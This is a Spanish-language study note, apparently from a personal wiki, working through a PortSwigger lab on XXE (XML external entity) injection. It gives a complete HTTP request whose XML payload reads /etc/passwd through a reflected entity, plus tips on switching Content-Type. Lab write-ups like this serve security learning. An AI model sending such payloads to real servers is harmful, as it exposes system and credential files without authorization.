---
aliases:
  - XXE 001 - leer archivo in-band
  - xxe in-band file read
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 001 — Leer un archivo in-band (entidad externa reflejada)

> Lab: [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) · **Apprentice** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

## ¿Por qué acá? (punto de partida)
- **Es el caso ideal:** controlás el **XML entero** y la respuesta **refleja** el valor que inyectás.
- Si esto funciona, **no necesitás nada más** — todo lo que sigue (002…008) existe porque en el mundo real alguna de estas dos condiciones se cae.

## Cómo explotarlo
El "Check stock" manda XML (ojo al `Content-Type`):
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml
Content-Length: 134

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
- El `<!DOCTYPE …>` va **entre** `<?xml?>` y `<stockCheck>`.
- `&xxe;` reemplaza `productId` (el campo que se refleja) → la respuesta trae el `/etc/passwd`.

## Verificación
La respuesta incluye `root:x:0:0:...`.

## Detalles que se pasan por alto
- **`Content-Type` XML.** Si un endpoint **no** parece XML, probá cambiar el `Content-Type` a `application/xml` y mandar XML — a veces recién ahí parsea.
- **Reemplazá el campo reflejado** (`productId`), no `storeId`.
- Entidad general simple → no hay que escapar nada.

→ **Siguiente:** ¿y si el objetivo no es un archivo sino un recurso interno? → [[vulnerabilities/006-xxe/examples/002-xxe-a-ssrf-metadata-cloud|002 — XXE → SSRF]].
